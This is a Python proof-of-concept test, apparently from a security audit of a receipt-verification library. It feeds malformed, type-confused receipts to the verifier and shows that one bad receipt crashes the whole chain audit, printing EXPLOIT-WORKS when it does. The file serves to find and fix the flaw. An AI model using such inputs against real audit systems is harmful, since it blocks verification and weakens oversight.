#!/usr/bin/env python3
"""S2.10/S2.6: type-confused fields crash the verifier — availability of
verification. verify_receipt() calls .get() on predicate sub-objects without
type checks and without a guard. actor=None, timestamps as a list, evidence
as None, items as a dict, or a non-dict receipt all raise UNCAUGHT
exceptions. In verify_chain, ONE malformed receipt aborts the entire audit —
no verdicts are produced for ANY receipt, including valid ones. An attacker
who can slip one malformed blob into a bundle (no key needed) denies the
audit.

Prints EXPLOIT-WORKS if any malformed input escapes as an exception instead
of a FAIL verdict.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         verify_chain, sha256_hex)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
good = build_receipt(action_id="a-800", subject_name="prod:svc", actor=HUMAN,
                     policy_decision=POL,
                     execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                     evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

T = "https://szl.dev/predicates/governed-action/v1"
malformed = {
    "actor=None":            {"predicateType": T, "signatures": [], "predicate": {"actor": None}},
    "timestamps=[]":         {"predicateType": T, "signatures": [], "predicate": {"timestamps": []}},
    "evidence=None":         {"predicateType": T, "signatures": [], "predicate": {"evidence": None}},
    "items=dict":            {"predicateType": T, "signatures": [],
                              "predicate": {"evidence": {"items": {"0": {"present": True}}}}},
    "predicate=None":        {"predicateType": T, "signatures": [], "predicate": None},
    "predicate=[]":          {"predicateType": T, "signatures": [], "predicate": []},
    "receipt=str":           "not a receipt at all",
}

exploit = False
for name, blob in malformed.items():
    try:
        v = verify_receipt(blob, pk)
        print(f"[{name:14s}] -> verdict {v.verdict} (handled)")
    except Exception as e:
        print(f"[{name:14s}] -> UNCAUGHT {type(e).__name__}: {e}")
        exploit = True

# Chain-level impact: one malformed receipt aborts the whole audit.
try:
    res = verify_chain([good, malformed["actor=None"]], pk)
    print(f"[chain poison] returned all_links_valid={res['all_links_valid']}")
except Exception as e:
    print(f"[chain poison] -> UNCAUGHT {type(e).__name__}: entire chain audit aborted, "
          f"no verdict for the VALID receipt either")
    exploit = True

print("EXPLOIT-WORKS" if exploit else "HELD")
